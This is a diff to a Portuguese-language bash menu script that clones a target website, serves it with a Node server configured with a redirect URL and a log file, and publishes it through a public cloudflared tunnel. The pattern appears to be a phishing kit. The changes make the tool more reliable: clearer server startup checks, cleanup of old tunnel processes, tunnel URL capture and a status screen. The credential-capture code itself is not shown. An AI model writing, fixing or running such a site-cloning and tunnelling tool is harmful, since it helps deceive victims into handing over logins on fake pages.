@@ -132,23 +132,25 @@ clone_site() {
     echo -e "${GREEN}╚═══════════════════════════════════════════╝${NC}"
 
     # Iniciar servidor e manter rodando
-    echo -e "${YELLOW}[...] Iniciando servidor...${NC}"
+    echo -e "${YELLOW}[...] Iniciando servidor na porta $port...${NC}"
     cd "$SCRIPT_DIR"
-    REDIRECT_URL="$redirect_url" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" nohup node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
+    REDIRECT_URL="$redirect_url" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
     local pid=$!
     echo "$pid" > "$SCRIPT_DIR/.server.pid"
-    sleep 2
+    sleep 3
 
+    # Verificar se subiu
     if kill -0 "$pid" 2>/dev/null; then
         echo -e "${GREEN}[✓] Servidor rodando! PID: $pid${NC}"
-        echo -e "${YELLOW}[✓] Acesse: http://${my_ip}:${port}${NC}"
+        echo -e "${GREEN}[✓] Acesse: http://${my_ip}:${port}${NC}"
     else
-        echo -e "${RED}[ERRO] Servidor falhou. Verifique: $SCRIPT_DIR/server.log${NC}"
+        echo -e "${RED}[ERRO] Servidor não subiu. Log:${NC}"
         cat "$SCRIPT_DIR/server.log" 2>/dev/null
+        rm -f "$SCRIPT_DIR/.server.pid"
     fi
 
     echo ""
-    echo -e "${PRESSIONE ENTER PARA VOLTAR AO MENU}${NC}"
+    echo -e "${YELLOW}Pressione Enter para voltar ao menu...${NC}"
     read
 }
 
@@ -235,24 +237,22 @@ start_tunnel() {
     fi
 
     # Parar túnel anterior
+    if [ -f "$SCRIPT_DIR/.tunnel.pid" ]; then
+        kill $(cat "$SCRIPT_DIR/.tunnel.pid") 2>/dev/null
+        rm -f "$SCRIPT_DIR/.tunnel.pid"
+    fi
     pkill -f cloudflared 2>/dev/null
     sleep 1
 
     echo -e "${YELLOW}[...] Iniciando túnel na porta $port...${NC}"
 
-    # Criar tunnel e capturar URL
-    local tunnel_output=$(cloudflared tunnel --url "http://localhost:$port" 2>&1 | head -20 &)
-    sleep 6
-
-    # Tentar capturar URL do processo
-    pkill -f "cloudflared.*tunnel" 2>/dev/null
-
-    # Método correto: rodar em background e ler o output
+    # Criar tunnel em background
     cloudflared tunnel --url "http://localhost:$port" > "$SCRIPT_DIR/.tunnel.log" 2>&1 &
     local tunnel_pid=$!
     echo "$tunnel_pid" > "$SCRIPT_DIR/.tunnel.pid"
-    sleep 5
+    sleep 6
 
+    # Capturar URL
     local tunnel_url=$(grep -oP 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' "$SCRIPT_DIR/.tunnel.log" 2>/dev/null | head -1)
 
     if [ -n "$tunnel_url" ] && [ "$tunnel_url" != "" ]; then
@@ -360,12 +360,12 @@ show_history() {
 show_localhost() {
     clear
     echo -e "${PURPLE}╔═══════════════════════════════════════════╗${NC}"
-    echo -e "${PURPLE}║         📍 LOCALHOST ATIVO               ║${NC}"
+    echo -e "${PURPLE}║         📍 SERVIDOR LOCAL                ║${NC}"
     echo -e "${PURPLE}╚═══════════════════════════════════════════╝${NC}"
     echo ""
 
     if [ ! -f "$SCRIPT_DIR/.server.pid" ]; then
-        echo -e "${RED}  Servidor não está rodando.${NC}"
+        echo -e "${RED}  Servidor OFF.${NC}"
         echo ""
         echo -e "${YELLOW}Enter...${NC}"
         read
@@ -374,7 +374,7 @@ show_localhost() {
 
     local pid=$(cat "$SCRIPT_DIR/.server.pid" 2>/dev/null)
     if ! kill -0 "$pid" 2>/dev/null; then
-        echo -e "${RED}  Servidor parou (PID $pid não existe).${NC}"
+        echo -e "${RED}  Servidor OFF (PID parou).${NC}"
         rm -f "$SCRIPT_DIR/.server.pid"
         echo ""
         echo -e "${YELLOW}Enter...${NC}"
@@ -387,12 +387,15 @@ show_localhost() {
     local target=$(grep 'TARGET_URL=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)
     local redirect=$(grep 'REDIRECT_URL=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)
 
-    echo -e "  ${GREEN}Servidor:${NC} ${WHITE}Rodando (PID: $pid)${NC}"
-    echo -e "  ${GREEN}IP Local:${NC} ${WHITE}$my_ip${NC}"
-    echo -e "  ${GREEN}Porta:${NC}     ${WHITE}$port${NC}"
-    echo -e "  ${GREEN}Local:${NC}     ${WHITE}http://${my_ip}:${port}${NC}"
-    echo -e "  ${GREEN}Alvo:${NC}      ${WHITE}$target${NC}"
-    echo -e "  ${GREEN}Redirect:${NC}  ${WHITE}$redirect${NC}"
+    [ -z "$port" ] && port=8080
+
+    echo -e "  ${GREEN}Status:${NC}  ${WHITE}ON ✓${NC}"
+    echo -e "  ${GREEN}PID:${NC}     ${WHITE}$pid${NC}"
+    echo -e "  ${GREEN}IP:${NC}      ${WHITE}$my_ip${NC}"
+    echo -e "  ${GREEN}Porta:${NC}   ${WHITE}$port${NC}"
+    echo -e "  ${GREEN}URL:${NC}     ${WHITE}http://${my_ip}:${port}${NC}"
+    echo -e "  ${GREEN}Alvo:${NC}    ${WHITE}$target${NC}"
+    echo -e "  ${GREEN}Redirect:${NC} ${WHITE}$redirect${NC}"
     echo ""
     echo -e "${YELLOW}Enter...${NC}"
     read
